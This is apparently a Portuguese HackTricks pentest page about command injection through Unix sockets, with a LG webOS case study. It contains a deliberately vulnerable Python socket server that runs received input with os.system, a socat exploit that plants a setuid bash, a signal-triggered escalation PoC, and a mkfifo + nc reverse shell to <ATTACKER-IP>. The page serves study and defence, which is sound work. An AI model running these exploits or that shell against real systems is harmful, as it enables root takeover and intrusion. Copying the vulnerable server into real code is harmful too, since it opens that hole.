# Injeção de Comandos via Socket

{{#include ../../banners/hacktricks-training.md}}

## Exemplo de binding de socket com Python

No exemplo a seguir, um **unix socket é criado** (`/tmp/socket_test.s`) e tudo o que for **recebido** será **executado** por `os.system`. Sei que você não encontrará isso na prática, mas o objetivo deste exemplo é mostrar como é o código que usa unix sockets e como gerenciar a entrada no pior caso possível.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** o código usando python: `python s.py` e **verifique como o socket está escutando**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Estudo de caso: escalation acionada por signal em UNIX socket pertencente ao root (LG webOS)

Alguns daemons privilegiados expõem um UNIX socket pertencente ao root que aceita entrada não confiável e associa ações privilegiadas a thread-IDs e signals. Se o protocolo permitir que um cliente sem privilégios influencie qual native thread será alvo, talvez seja possível acionar um caminho de código privilegiado e realizar escalation.<sup>[[1]](#references)[[2]](#references)</sup>

O write-up principal e a divulgação descrevem a seguinte sequência.<sup>[[1]](#references)[[2]](#references)</sup>

Padrão observado:
- Conectar-se a um socket pertencente ao root (por exemplo, /tmp/remotelogger).
- Criar uma thread e obter seu native thread id (TID).
- Enviar o TID (packed) mais padding como uma requisição; receber uma confirmação.
- Enviar um signal específico para esse TID para acionar o comportamento privilegiado.

O PoC resumido abaixo reproduz essa sequência.<sup>[[1]](#references)[[2]](#references)</sup>
Esboço de PoC mínimo:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para transformar isso em um shell de root, um padrão simples de named-pipe + nc pode ser usado.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Esta classe de bugs surge ao confiar em valores derivados do estado do cliente sem privilégios (TIDs) e vinculá-los a signal handlers ou lógica privilegiados.<sup>[[1]](#references)</sup>
- Reforce a segurança impondo credenciais no socket, validando os formatos das mensagens e desacoplando operações privilegiadas de identificadores de thread fornecidos externamente.

## References

- [1] [Jailbreak do webOS por diversão (apenas por diversão)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Path Traversal, Authentication Bypass e tomada completa do dispositivo em LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
